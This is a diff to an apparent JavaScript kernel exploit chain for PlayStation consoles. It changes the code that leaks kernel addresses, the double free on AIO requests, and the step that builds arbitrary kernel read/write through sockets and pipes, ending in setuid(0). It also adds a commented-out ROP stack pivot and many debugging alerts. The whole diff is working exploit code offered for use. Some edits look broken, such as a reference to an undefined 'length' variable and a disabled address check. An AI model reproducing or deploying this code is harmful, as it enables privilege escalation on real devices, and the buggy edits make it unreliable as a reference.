@@ -167,6 +167,8 @@ const kernel_offsets = (() => {
 })();
 
 const pthread_offsets = fw_config.pthread_offsets;
+const off_longjmp = fw_config.off_longjmp;
+const off_sceKernelRaiseException = fw_config.off_sceKernelRaiseException;
 const off_kstr = fw_config.off_kstr;
 const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
 const off_sysent_661 = fw_config.off_sysent_661;
@@ -1032,7 +1034,7 @@ function leak_kernel_addrs(sd_pair, sds) {
     // spray_aio(num_handles, leak_reqs_p, num_elems, leak_ids_p, true, AIO_CMD_WRITE);
     // aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx))
     for (let j = 0; j < num_sds; j++) {
-      wbuf.write32(8, j + 1);
+      wbuf.write32(8, j);
       aio_submit_cmd(cmd, leak_reqs_p, num_elems, leak_ids_p.add(j * step));
       set_rthdr(sds[j], wbuf, rsize);
     }
@@ -1081,7 +1083,9 @@ function leak_kernel_addrs(sd_pair, sds) {
   log("leaked aio_entry:");
   hexdump(reqs2);
 
+  // store for curproc leak later
   const aio_info_addr = buf.read64(reqs2_off + 0x18);
+  log(`aio_info_addr: ${aio_info_addr}`);
 
   const reqs1_addr = new Long(buf.read64(reqs2_off + 0x10));
   reqs1_addr.lo &= ~0xff;
@@ -1337,6 +1341,7 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
   close(pktopts_sds[1]);
   for (let i = 0; i < num_alias; i++) {
     for (let i = 0; i < sds_alt.length; i++) {
+      if (sds_alt[i] < 0) continue; // skip invalid sockets
       // if a socket doesn't have a pktopts, setting the rthdr will make
       // one. the new pktopts might reuse the memory instead of the
       // rthdr. make sure the sockets already have a pktopts before
@@ -1365,16 +1370,20 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
   const nhop_p = nhop.addr;
   const read_buf = new Buffer(8);
   const read_buf_p = read_buf.addr;
-  function kread64(addr) {
+  function kread64(addr, kpipe = false) {
     const len = 8;
     let offset = 0;
+    if(kpipe) alert("starting kpipe read");
     while (offset < len) {
       // pktopts.ip6po_nhinfo = addr + offset
       pktinfo.write64(8, addr.add(offset));
       nhop[0] = len - offset;
-
-      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14);
-      sysi("getsockopt", psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf_p.add(offset), nhop_p);
+      const opts = {
+        offset, length, nhop
+      }
+      alert(`Reading: ${JSON.stringify(opts)}`);
+      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo.size);
+      gsockopt(psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf_p.add(offset), nhop_p);
 
       const n = nhop[0];
       if (n === 0) {
@@ -1399,12 +1408,15 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
   // const kbase = kernel_addr.sub(off_kstr);
   // log(`kernel base: ${kbase}`);
 
-  alert("making arbitrary kernel read/write");
   log("\nmaking arbitrary kernel read/write");
 
   const off_td_proc = 8;
   const proc = kread64(aio_info_addr.add(off_td_proc));
   log(`proc: ${proc}`);
+  // if ((proc >>> 48) !== 0xffff) {
+  //   log(`invalid proc kernel address: ${hex(proc)}`);
+  //   die(`invalid proc kernel address`);
+  // }
   const pid = sysi("getpid");
   log(`our pid: ${pid}`);
   const pid2 = kread64(proc.add(kernel_offsets.proc_pid));
@@ -1414,37 +1426,91 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
     die("process not found");
   }
 
-  alert("Process found!");
-
   const p_fd = kread64(proc.add(kernel_offsets.proc_fd));
   log(`proc.p_fd: ${p_fd}`);
   // curthread->td_proc->p_fd->fd_ofiles
-  const ofiles = kread64(p_fd);
+  const ofiles = kread64(p_fd.add(kernel_offsets.filedesc_ofiles));
   log(`ofiles: ${ofiles}`);
 
-  alert(`ofiles: ${ofiles}`);
+  const pipes = new View4([-1, -1]);
+  const pipes_p = pipes.addr;
+  let kpipe = null;
+  if (is_ps4) {
+    sysi("pipe", pipes_p);
+    const pipe_file = kread64(ofiles.add(pipes[0] * kernel_offsets.sizeof_ofiles));
+    log(`pipe file: ${pipe_file}`);
+    // ofiles[pipe_fd].f_data
+    kpipe = kread64(pipe_file);
+    log(`pipe pointer: ${kpipe}`);
+  } else {
+    // const jmpbuf = new Buffer(0x60);
+    // const thr = new Chain();
+    // thr.push_syscall("pipe2", pipes_p, 0);
+    // thr.push_store_rax_into_memory(ofiles.add(0));
+    // thr.push_store_rdx_into_memory(ofiles.add(4));
+    // const longjmp = rop.libc_base.add(off_longjmp);
+    // const raiseException = rop.libkernel_base.add(off_sceKernelRaiseException);
+    // thr.push_call(longjmp, jmpbuf.addr, 0);
+    // thr.push_call(raiseException);
+    // thr.push_get_retval();
+    // thr.push_call("pthread_exit", 0);
 
-  const pipes = new View4(2);
-  sysi("pipe", pipes.addr);
-  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
-  log(`pipe file: ${pipe_file}`);
-  // ofiles[pipe_fd].f_data
-  const kpipe = kread64(pipe_file);
-  log(`pipe pointer: ${kpipe}`);
+    // // run ropchain
+    // const ctx = new Buffer(context_size);
+    // const pthread = new Pointer();
+    // pthread.ctx = ctx;
+    // // pivot the pthread's stack pointer to our stack
+    // ctx.write64(0x38, thr.stack_addr);
+    // ctx.write64(0x80, thr.get_gadget("ret"));
 
-  alert(`pipe pointer: ${kpipe}`);
+    // alert('about to start thread');
 
+    // call_nze("pthread_create", pthread.addr, 0, chain.get_gadget("setcontext"), ctx.addr);
+    // call_nze("pthread_join", pthread, 0);
+
+    // alert('weirdness done');
+    // // local retval = self: get_last_retval_addr()
+    // // if retval then
+    // // return memory.read_qword(retval)
+
+    // const pipe_file = kread64(ofiles.add(pipes[0] * kernel_offsets.sizeof_ofiles));
+    // log(`pipe file: ${pipe_file}`);
+    // // ofiles[pipe_fd].f_data
+    // kpipe = kread64(pipe_file);
+    // log(`pipe pointer: ${kpipe}`);
+    // alert('Pipe done');
+
+    alert('pipes');
+    sysi("pipe2", pipes_p, 0);
+    alert('created pipes');
+    const pipe_read = pipes[0];
+    log(`pipe read: ${pipe_read} | ${hex(pipe_read)}, type: ${typeof pipe_read}`);
+    const pipe_fd = ofiles.add(pipe_read * kernel_offsets.sizeof_ofiles);
+    alert('pipe_fd done');
+    log(`pipe_fd: ${pipe_fd} | ${hex(pipe_fd)}, type: ${typeof pipe_fd}`)
+    const pipe_file = kread64(pipe_fd);
+    alert('pipe_file done');
+    log(`pipe_file: ${pipe_file} | ${hex(pipe_file)}, type: ${typeof pipe_file}`)
+    kpipe = kread64(pipe_file, true);
+  }
+
+  if (kpipe === null) {
+    log(`failed to create kpipe`);
+    die(`failed to create kpipe`);
+  }
+
+  alert('Pipe done, got kpipe.');
   const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
   for (let off = 0; off < pipe_save.size; off += 8) {
     pipe_save.write64(off, kread64(kpipe.add(off)));
   }
 
-  alert("Before new_socket()");
-
   const main_sd = psd;
   const worker_sd = new_socket();
 
-  const main_file = kread64(ofiles.add(main_sd * 8));
+  log("Created worker socket");
+
+  const main_file = kread64(ofiles.add(main_sd * kernel_offsets.sizeof_ofiles));
   log(`main sock file: ${main_file}`);
   // ofiles[sd].f_data
   const main_sock = kread64(main_file);
@@ -1462,9 +1528,10 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
     die("main pktopts pointer != leaked pktopts pointer");
   }
 
-  alert('About to do socket shennanigans');
+  log("main pktopts pointer is the same as leaked pktopts pointer");
+
   // ofiles[sd].f_data
-  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
+  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * kernel_offsets.sizeof_ofiles)));
   log(`reclaim sock pointer: ${reclaim_sock}`);
   // socket.so_pcb (struct inpcb *)
   const r_pcb = kread64(reclaim_sock.add(kernel_offsets.so_pcb));
@@ -1474,7 +1541,7 @@ function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_
   log(`reclaim pktopts: ${r_pktopts}`);
 
   // ofiles[sd].f_data
-  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
+  const worker_sock = kread64(kread64(ofiles.add(worker_sd * kernel_offsets.sizeof_ofiles)));
   log(`worker sock pointer: ${worker_sock}`);
   // socket.so_pcb (struct inpcb *)
   const w_pcb = kread64(worker_sock.add(kernel_offsets.so_pcb));
@@ -1880,6 +1947,7 @@ export async function kexploit() {
     const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf,
       fake_reqs3_addr, fake_reqs3_sd, aio_info_addr
     ] = leak_kernel_addrs(sd_pair, sds);
+    alert('Leaked kernel addresses');
 
     log("\nSTAGE: Double free SceKernelAioRWRequest");
     const pktopts_sds = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[0], sds, sds_alt, fake_reqs3_addr);
@@ -1904,32 +1972,34 @@ export async function kexploit() {
     log(`time - init time: ${(ftime - init_time) / 1000}`);
 
     // Cleaning up
+    chain.reset();
+    alert("Cleaning up");
     if (unblock_fd !== undefined && unblock_fd !== null) {
       close(unblock_fd);
     }
-  }
-  if (block_fd !== undefined && block_fd !== null) {
-    close(block_fd);
-  }
-  if (groom_ids) {
-    free_aios2(groom_ids.addr, num_grooms);
-  }
-  if (block_id) {
-    aio_multi_wait(block_id.addr, 1);
-    aio_multi_delete(block_id.addr, 1);
-  }
-  for (const sd of sds) {
-    close(sd);
-  }
-  for (const sd_alt of sds_alt) {
-    close(sd_alt);
-  }
+    if (block_fd !== undefined && block_fd !== null) {
+      close(block_fd);
+    }
+    if (groom_ids) {
+      free_aios2(groom_ids.addr, num_grooms);
+    }
+    if (block_id) {
+      aio_multi_wait(block_id.addr, 1);
+      aio_multi_delete(block_id.addr, 1);
+    }
+    for (const sd of sds) {
+      close(sd);
+    }
+    for (const sd_alt of sds_alt) {
+      close(sd_alt);
+    }
 
-  // Restore core/rtprio
-  log(`restoring core: ${current_core}`);
-  log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
-  pin_to_core(current_core);
-  set_rtprio(current_rtprio);
+    // Restore core/rtprio
+    log(`restoring core: ${current_core}`);
+    log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+    pin_to_core(current_core);
+    set_rtprio(current_rtprio);
+  }
 
   // Check if it all worked
   log("setuid(0)");
